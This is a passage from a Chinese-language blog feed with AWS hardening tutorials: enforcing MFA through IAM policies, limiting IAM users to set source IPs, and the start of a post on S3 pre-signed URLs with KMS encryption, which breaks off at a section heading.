    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>众所周知，AWS在账号体系这块支持使用MFA，而我们在使用MFA的时候通常有如下几种场景：</p><ol><li>用或者不用MFA都行</li><li>通过Policy强制User使用MFA（console、CLI），不用的话就不让你访问</li><li>通过Policy强制User在控制台使用MFA，在CLI上不使用MFA（安全向业务需求的妥协）</li><li>MFA相关Policy Key的解读</li><li>Yubikey、硬件MFA设备初体验</li></ol><p>所以说嘛，安全这个事是相对的，回到安全哲学上，这件事取决于要保护的业务资产的重要程度和价值。下面就上述几种情况的使用场景及配置方法，做一下逐一说明。（需要留意的是目前在AWS中国区只支持虚拟MFA设备，不支持硬件MFA设备或者Yubikey。）</p><h2 id="0x01-配置IAM-User支持MFA（用或者不用MFA都不影响User能否使用AWS资源）"><a href="#0x01-配置IAM-User支持MFA（用或者不用MFA都不影响User能否使用AWS资源）" class="headerlink" title="0x01 配置IAM User支持MFA（用或者不用MFA都不影响User能否使用AWS资源）"></a>0x01 配置IAM User支持MFA（用或者不用MFA都不影响User能否使用AWS资源）</h2><p>我有一个附加了管理员权限的IAM User，但是没有附加任何MFA相关的Policy。这种情况下就属于用不用MFA都行的场景，通常适用于安全意识比较高，可以自觉配置的MFA的同学，比如说企业的安全工程师。或者作为测试账号用用。<br>下面我们就来看看MFA功能如何配置：</p><ol><li>搞个虚拟MFA APP（AWS中国区目前只支持虚拟MFA设备，不支持硬件MFA、Yubikey）</li><li>去IAM控制台配置</li></ol><p><img src="3D66C465786E4FAE9135A6B7826806F4" alt="image"></p><p><img src="EA93F91C93334C639D5ED4456143F8DC" alt="image"></p><p>配置完成后，当我们在控制台登录该IAM User时，是需要输入PIN code的（CLI不需要）。</p><p><img src="35F70F1DED114FDA9F3A73B40C7C6730" alt="image"></p><p><img src="947CD5A416864CDBB1880738CEC393FC" alt="image"></p><p>登录之后，就可以访问里头的服务和资源了。CLI可以直接使用，而无需使用MFA：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 ls --profile mfa_tonghua --region cn-north-1</span><br></pre></td></tr></table></figure></p><p><img src="17B71694C22E487988915CEFBCA86B67" alt="image"></p><h2 id="0x02-通过Policy强制User使用MFA（console、CLI），不用的话就不让你访问"><a href="#0x02-通过Policy强制User使用MFA（console、CLI），不用的话就不让你访问" class="headerlink" title="0x02 通过Policy强制User使用MFA（console、CLI），不用的话就不让你访问"></a>0x02 通过Policy强制User使用MFA（console、CLI），不用的话就不让你访问</h2><p>可以看到上述配置有一个小问题，就是我没有MFA的Policy，当这个User取消MFA之后仍然可以正常登录AWS控制台。那作为一家安全意识比较高的企业或者团队，要求强制使用MFA，如果不使用的话，就不让你继续访问AWS的服务，这里我就说说这个Policy该怎么实现 [2]。按照文档中的Policy，几乎不用做任何修改，附加至User上看看（arn:aws:iam::需要替换成符合中国区规范的arn地址 arn:aws-cn:iam::）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">    &quot;Statement&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;AllowViewAccountInfo&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Action&quot;: &quot;iam:ListVirtualMFADevices&quot;,</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;AllowManageOwnVirtualMFADevice&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Action&quot;: [</span><br><span class="line">                &quot;iam:CreateVirtualMFADevice&quot;,</span><br><span class="line">                &quot;iam:DeleteVirtualMFADevice&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Resource&quot;: &quot;arn:aws-cn:iam::*:mfa/$&#123;aws:username&#125;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;AllowManageOwnUserMFA&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Action&quot;: [</span><br><span class="line">                &quot;iam:DeactivateMFADevice&quot;,</span><br><span class="line">                &quot;iam:EnableMFADevice&quot;,</span><br><span class="line">                &quot;iam:GetUser&quot;,</span><br><span class="line">                &quot;iam:ListMFADevices&quot;,</span><br><span class="line">                &quot;iam:ResyncMFADevice&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Resource&quot;: &quot;arn:aws-cn:iam::*:user/$&#123;aws:username&#125;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;DenyAllExceptListedIfNoMFA&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Deny&quot;,</span><br><span class="line">            &quot;NotAction&quot;: [</span><br><span class="line">                &quot;iam:CreateVirtualMFADevice&quot;,</span><br><span class="line">                &quot;iam:EnableMFADevice&quot;,</span><br><span class="line">                &quot;iam:GetUser&quot;,</span><br><span class="line">                &quot;iam:ListMFADevices&quot;,</span><br><span class="line">                &quot;iam:ListVirtualMFADevices&quot;,</span><br><span class="line">                &quot;iam:ResyncMFADevice&quot;,</span><br><span class="line">                &quot;sts:GetSessionToken&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Condition&quot;: &#123;</span><br><span class="line">                &quot;BoolIfExists&quot;: &#123;&quot;aws:MultiFactorAuthPresent&quot;: &quot;false&quot;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>策略配置成功之后，当我们在CLI中访问可以看到已经报访问拒绝（Access Denied）的错误了。</p><p><img src="5E534B87C80C4CFDBFEF896BEF3EC107" alt="image"></p><p>然后，当我把MFA设备取消激活之后，发现在控制台登录也会被禁止访问了（准确的说，是可以登录成功，但是无法访问任何资源，只有激活MFA之后才能继续使用）。</p><p><img src="26CCA68D594D4913AAD11A0F6C4CAF0E" alt="image"></p><p><img src="446075F33753457D9822CB2BCE2BBBB7" alt="image"></p><p>恩，构造好类似这样的URL：<a href="https://console.amazonaws.cn/iam/home?region=cn-north-1#/users/mfa_tonghua?section=security_credentials" target="_blank" rel="noopener">https://console.amazonaws.cn/iam/home?region=cn-north-1#/users/mfa_tonghua?section=security_credentials</a>当前用户可以给自己创建虚拟MFA设备啦。<br>那你可能就要说了，我控制台上能输入PIN Code访问了，那我CLI咋整啊，有啥参数可以指定吗。emm，莫得慌张CLI可以这么玩[3]（思路就是输入PIN Code创建临时访问凭证，然后使用临时的访问凭证去访问AWS资源）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-session-token --serial-number arn:aws-cn:iam::123456789012:mfa/mfa_tonghua --token-code 631424 --profile mfa_tonghua --region cn-north-1</span><br></pre></td></tr></table></figure></p><p><img src="01961727B5AB4F0BAE524FDA892BBC9C" alt="image"></p><p>–token-code 参数就是虚拟MFA设备上头的动态PIN Code。<br>然后配置临时的访问凭证访问即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export AWS_ACCESS_KEY_ID=333</span><br><span class="line">export AWS_SECRET_ACCESS_KEY=222</span><br><span class="line">export AWS_SESSION_TOKEN=111</span><br></pre></td></tr></table></figure></p><p>可以看到已经可以使用临时访问凭证，访问AWS的资源了：</p><p><img src="C253E76D22594AB898FC5779A4443EC7" alt="image"></p><p>如果您通过–debug查看的话可以看到，使用的凭证就是在环境变量env中加载出来的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2019-11-25 06:10:51,777 - MainThread - botocore.credentials - DEBUG - Looking for credentials via: env</span><br><span class="line">2019-11-25 06:10:51,778 - MainThread - botocore.credentials - INFO - Found credentials in environment variables.</span><br></pre></td></tr></table></figure></p><p>如果您不想使用环境变量中的临时凭证了，使用unset命令，删掉指定的环境变量即可。</p><h2 id="0x03-通过Policy强制User在控制台使用MFA，在CLI上不使用MFA（安全向业务需求的妥协）"><a href="#0x03-通过Policy强制User在控制台使用MFA，在CLI上不使用MFA（安全向业务需求的妥协）" class="headerlink" title="0x03 通过Policy强制User在控制台使用MFA，在CLI上不使用MFA（安全向业务需求的妥协）"></a>0x03 通过Policy强制User在控制台使用MFA，在CLI上不使用MFA（安全向业务需求的妥协）</h2><p>上面那种CLI/Console中都强制使用MFA是最稳的一种方式。有的时候，业务部门的同事jio着CLI上还要输入MFA的PIN Code然后拿临时访问凭证好麻烦啊，能不能CLI上不走MFA额，这件事情是可以做到的，但是在做之前要明确几件事情：</p><ol><li>现有的CLI通过输入PIN Code生成临时访问凭证的方式为什么不能满足需求？</li><li>有没有尝试使用EC2 Role的方式？能不能满足需求？</li><li>不走MFA，CLI凭证泄露的风险由业务部门自行承担<br>几个问题都问完之后，就可以接着往下操作了，其实很简单，只要修改Policy中的如下部分即可：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;Effect&quot; : &quot;Deny&quot;,</span><br><span class="line">&quot;Condition&quot; : &#123; &quot;Bool&quot; : &#123; &quot;aws:MultiFactorAuthPresent&quot; : false &#125; &#125;</span><br></pre></td></tr></table></figure></li></ol><p>唯一的区别就是将BoolIfExists修改为Bool，先测试一下看看效果，稍后会对这些Key做详细的解读。<br>可以看到CLI上已经无需使用MFA了，而控制台仍然需要：</p><p><img src="D530FCB6AE2C423A9FE935980D84CFEB" alt="image"></p><p><img src="0D3022349B0E454FA8488EBB615F97B0" alt="image"></p><p>搞定！</p><h2 id="0x04-MFA相关Policy-Key的解读"><a href="#0x04-MFA相关Policy-Key的解读" class="headerlink" title="0x04 MFA相关Policy Key的解读"></a>0x04 MFA相关Policy Key的解读</h2><p>在这一小节，我就着重说一说Policy中跟MFA息息相关的Policy Key，一共如下几个：</p><ol><li>aws:MultiFactorAuthPresent</li><li>BoolIfExists</li><li>Bool<br>aws:MultiFactorAuthPresent是Policy中的全局Condition Key[4]，当用户使用临时访问凭证发起请求时，在其请求的上下文中会包含该Key，使用持久化的访问凭证发起请求时，在其请求上下文中是不包含该Key的。<br>那什么是临时访问凭证发起的请求呢？典型有控制台、Role、或者get-session-token生成的凭证都是临时访问凭证。<br>那CLI/控制台都是用MFA的Policy怎么解读呢：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;Effect&quot; : &quot;Deny&quot;,</span><br><span class="line">&quot;Condition&quot; : &#123; &quot;BoolIfExists&quot; : &#123; &quot;aws:MultiFactorAuthPresent&quot; : false &#125; &#125;</span><br></pre></td></tr></table></figure></li></ol><p>临时访问凭证中包含aws:MultiFactorAuthPresent这个Key，<br>在请求上下文中，如果包含aws:MultiFactorAuthPresent这个Key，并且这个Key等于true代表用了MFA，等于false代表没走MFA。<br>那回到这个Policy，当我使用了MFA时，aws:MultiFactorAuthPresent==true，然后这个Condition不成立，就不会执行该Policy，然后就会allow继续操作，如果我没使用MFA，aws:MultiFactorAuthPresent==false，条件成立，Policy生效，会Deny掉相关的API call。当我使用持久凭证时，没有aws:MultiFactorAuthPresent这个Key，所以默认Condition成立，进而Policy成立，会Deny掉相关API call。<br>在控制台中使用MFA，CLI中不使用MFA的Policy解读：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;Effect&quot; : &quot;Deny&quot;,</span><br><span class="line">&quot;Condition&quot; : &#123; &quot;Bool&quot; : &#123; &quot;aws:MultiFactorAuthPresent&quot; : false &#125; &#125;</span><br></pre></td></tr></table></figure></p><p>在请求上下文中，aws:MultiFactorAuthPresent == true（使用MFA）时，Condition不成立，Policy不生效，可以执行相关API call，等于false时，Condition成立，Policy生效，会被Deny掉相关API call。</p><h2 id="0x05-Yubikey、硬件MFA设备初体验"><a href="#0x05-Yubikey、硬件MFA设备初体验" class="headerlink" title="0x05 Yubikey、硬件MFA设备初体验"></a>0x05 Yubikey、硬件MFA设备初体验</h2><p>注意了，以下的配置目前并不适用于AWS中国区，但是为了保证文章的完整性，我在AWS Global区域做了测试。<br>先来看看YubiKey：</p><p><img src="C50C284BCEBA43139F04D4E04D62E3FD" alt="image"></p><p><img src="864AB0BA795A4F7CAAED771212D9A661" alt="image"></p><p><img src="D7227C6E1F3945C48B17034ACA65575A" alt="image"></p><p>再登录的时候就变成这样了：</p><p><img src="2942EB24F2E645539942FAD9C4F36542" alt="image"></p><p>当然，遇到问题了也别慌，参考下这个[5]，看能不能解决您的问题。<br>硬件MFA设备先不看了，我的设备是8位的，它的好像只能6位？</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>记录一下AWS使用MFA的常见场景，备忘。</p><h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><p>[1] Multi-factor Authentication, <a href="https://aws.amazon.com/cn/iam/features/mfa/" target="_blank" rel="noopener">https://aws.amazon.com/cn/iam/features/mfa/</a><br>[2] AWS: Allows MFA-Authenticated IAM Users to Manage Their Own MFA Device on the My Security Credentials Page, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_aws_my-sec-creds-self-manage-mfa-only.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_aws_my-sec-creds-self-manage-mfa-only.html</a><br>[3] How do I use an MFA token to authenticate access to my AWS resources through the AWS CLI?, <a href="https://aws.amazon.com/premiumsupport/knowledge-center/authenticate-mfa-cli/?nc1=h_ls" target="_blank" rel="noopener">https://aws.amazon.com/premiumsupport/knowledge-center/authenticate-mfa-cli/?nc1=h_ls</a><br>[4] AWS Global Condition Context Keys, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html</a><br>[5] Troubleshooting U2F Security Keys, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/troubleshoot_mfa-u2f.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/IAM/latest/UserGuide/troubleshoot_mfa-u2f.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;众所周知，AWS在账号体系这块支持使用MFA，而我们在使用MFA的时候通常有如下几种场景：&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何限制IAM User只能在指定的IP登录？</title>
    <link href="https://tonghuaroot.com/2019/11/23/Specify-IP-Use-AWS/"/>
    <id>https://tonghuaroot.com/2019/11/23/Specify-IP-Use-AWS/</id>
    <published>2019-11-23T07:52:47.000Z</published>
    <updated>2019-11-23T15:56:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>无论是创建IAM User的时候，还是在配置Policy的时候，都可以看到Policy中的Condition中是有一个aws:SourceIp属性的。</p><h2 id="0x01-如何写这个Polciy"><a href="#0x01-如何写这个Polciy" class="headerlink" title="0x01 如何写这个Polciy"></a>0x01 如何写这个Polciy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">    &quot;Statement&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;VisualEditor0&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Action&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Condition&quot;: &#123;</span><br><span class="line">                &quot;IpAddress&quot;: &#123;</span><br><span class="line">                    &quot;aws:SourceIp&quot;: &quot;54.222.xxx.xxx/32&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>aws:SourceIp键对应的值修改为办公网出口IP即可（保险起见要确定出口IP是固定不变的，而不是采用的动态IP）。</p><p>那你可能就要说了，如果我有多个IP段那该咋整呢？简单，可以跟着这个Policy改改就行了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">    &quot;Statement&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;VisualEditor0&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Action&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Condition&quot;: &#123;</span><br><span class="line">                &quot;ForAnyValue:IpAddress&quot;: &#123;</span><br><span class="line">                    &quot;aws:SourceIp&quot;: [</span><br><span class="line">                        &quot;54.222.xxx.xxx/32&quot;,</span><br><span class="line">                        &quot;192.168.1.1&quot;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上述Policy可同时限制CLI和console。</p><h2 id="0x02-Policy-参数解读"><a href="#0x02-Policy-参数解读" class="headerlink" title="0x02 Policy 参数解读"></a>0x02 Policy 参数解读</h2><p>在上面的示例Policy中，有几个参数还是比较有价值的，一一解读一下ForAnyValue、IpAddress、aws:SourceIp：</p><ol><li>ForAnyValue，只要有一个值在符合要求，那就是符合要求</li><li>IpAddress，IP地址，支持普通的地址格式、CIDR格式</li><li>aws:SourceIp，请求的客户端IP</li></ol><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>额，这种直接测一下就行了，生产环境上头还是先测测，确认可行再上生产。</p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p>[1] Creating a Condition with Multiple Keys or Values, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html</a><br>[2] Request, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/intro-structure.html#intro-structure-request" target="_blank" rel="noopener">https://docs.aws.amazon.com/IAM/latest/UserGuide/intro-structure.html#intro-structure-request</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;无论是创建IAM User的时候，还是在配置Policy的时候，都可以看到Policy中的Condi
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>S3 pre-signed URL 与 KMS 加密那些事</title>
    <link href="https://tonghuaroot.com/2019/11/23/S3-pre-signed-url-and-KMS/"/>
    <id>https://tonghuaroot.com/2019/11/23/S3-pre-signed-url-and-KMS/</id>
    <published>2019-11-23T06:53:55.000Z</published>
    <updated>2019-11-23T15:05:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在这篇文章中，我会记录一下关于S3 pre-signed url和KMS加密交互的一些玩法。比如说：</p><ol><li>简单介绍一下什么是S3 pre-signed URL</li><li>经过KMS加密之后还能直接公开访问object吗？</li><li>经过KMS加密之后还能通过pre-signed URL的方式将object公开访问吗？</li><li>访问S3 pre-signed URL报认证错误应该怎么处理？</li></ol><h2 id="0x01-S3-pre-signed-URL-概述"><a href="#0x01-S3-pre-signed-URL-概述" class="headerlink" title="0x01 S3 pre-signed URL 概述"></a>0x01 S3 pre-signed URL 概述</h2><p>简单理解，就是我们想将一个S3桶中的对象临时公开，可以通过presign命令生成一个临时有效期的链接，而用户可以通过这个临时的URL下载并访问对象。<br>话不多说了，先来个命令看看咋回事，正常情况下我们使用有权限的AKSK访问指定对象时会通过如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/webwxgeticon.jpg webwxgetion.jpg --profile root</span><br><span class="line">download: s3://aaabbbccc/webwxgeticon.jpg to ./webwxgetion.jpg</span><br></pre></td></tr></table></figure></p><p>如果我们没有登录去下载的话，通常会报一个访问禁止的403错误，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/webwxgeticon.jpg webwxgetion.jpg --no-sign-request</span><br><span class="line">fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden</span><br></pre></td></tr></table></figure></p><p>使用浏览器或者wget直接下载的话，会报如下错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# wget https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg</span><br><span class="line">--2019-11-23 13:33:05--  https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg</span><br><span class="line">Resolving aaabbbccc.s3.cn-north-1.amazonaws.com.cn (aaabbbccc.s3.cn-north-1.amazonaws.com.cn)... 54.222.49.142</span><br><span class="line">Connecting to aaabbbccc.s3.cn-north-1.amazonaws.com.cn (aaabbbccc.s3.cn-north-1.amazonaws.com.cn)|54.222.49.142|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 403 Forbidden</span><br><span class="line">2019-11-23 13:33:05 ERROR 403: Forbidden.</span><br><span class="line"></span><br><span class="line">[root@ip-10-0-0-64 ~]# curl https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;Error&gt;&lt;Code&gt;AccessDenied&lt;/Code&gt;&lt;Message&gt;Access Denied&lt;/Message&gt;&lt;RequestId&gt;39231AA211436AF7&lt;/RequestId&gt;&lt;HostId&gt;a7athzq0DU1D11oBpMF9ZeNziPz9sjw1ZLY0Ga+xUmpMN1ZkhnITDci7zisSfDa+nyTcw/sbSkk=&lt;/HostId&gt;&lt;/Error&gt;[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p><img src="C271ADB4280441099A8820744E327476" alt="image"></p><p>当然，上述做法是因为我没有把对象开放公开访问的权限，所以报错是正常的。这个时候我有一个使用场景，就是我想把一个对象临时的开放给某一个用户，而这通常有两种做法，一种是直接公开，另一种是使用这里提到的pre-signed URL的方法，第一种直接公开的方法是并不可取的，因为如果有人能爆破出来这个URL的话，那他就可以直接下载这个对象了，而且在对象有效期管理上，也是一个比较复杂的事，那我们直接上pre-signed URL看看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 presign s3://aaabbbccc/webwxgeticon.jpg --profile root</span><br><span class="line">https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=AKIAXUIR4JOPO4YK27P7%2F20191123%2Fcn-north-1%2Fs3%2Faws4_request&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Date=20191123T133719Z&amp;X-Amz-Signature=1bdedc3e99edc60fd266f10ec4368166112d9b311610f02910304ae6eda28503</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p>然后拿着这个pre-signed URL就可以访问对象了：</p><p><img src="20D5E656FCA04A1080FEEF186C561CFF" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3api head-object --bucket aaabbbccc --key webwxgeticon.jpg --profile root</span><br><span class="line">&#123;</span><br><span class="line">    &quot;AcceptRanges&quot;: &quot;bytes&quot;,</span><br><span class="line">    &quot;ContentType&quot;: &quot;image/jpeg&quot;,</span><br><span class="line">    &quot;LastModified&quot;: &quot;Sat, 23 Nov 2019 13:31:01 GMT&quot;,</span><br><span class="line">    &quot;ContentLength&quot;: 13048,</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;bade48249f0809beca0226e7ec4ef50f\&quot;&quot;,</span><br><span class="line">    &quot;Metadata&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 ~]# curl &quot;https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=AKIAXUIR4JOPO4YK27P7%2F20191123%2Fcn-north-1%2Fs3%2Faws4_request&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Date=20191123T133719Z&amp;X-Amz-Signature=1bdedc3e99edc60fd266f10ec4368166112d9b311610f02910304ae6eda28503&quot; --output 1.jpg</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 13048  100 13048    0     0   326k      0 --:--:-- --:--:-- --:--:--  326k</span><br><span class="line">[root@ip-10-0-0-64 ~]# md5sum 1.jpg</span><br><span class="line">bade48249f0809beca0226e7ec4ef50f  1.jpg</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure><p><img src="90381681BAE849C691F443B27228E3DE" alt="image"></p><p>上面就是一个S3 pre-signed URL的正常使用流程，接下来看看各种奇葩场景。</p><h2 id="0x02-经过KMS加密之后还能直接公开访问object吗？"><a href="#0x02-经过KMS加密之后还能直接公开访问object吗？" class="headerlink" title="0x02 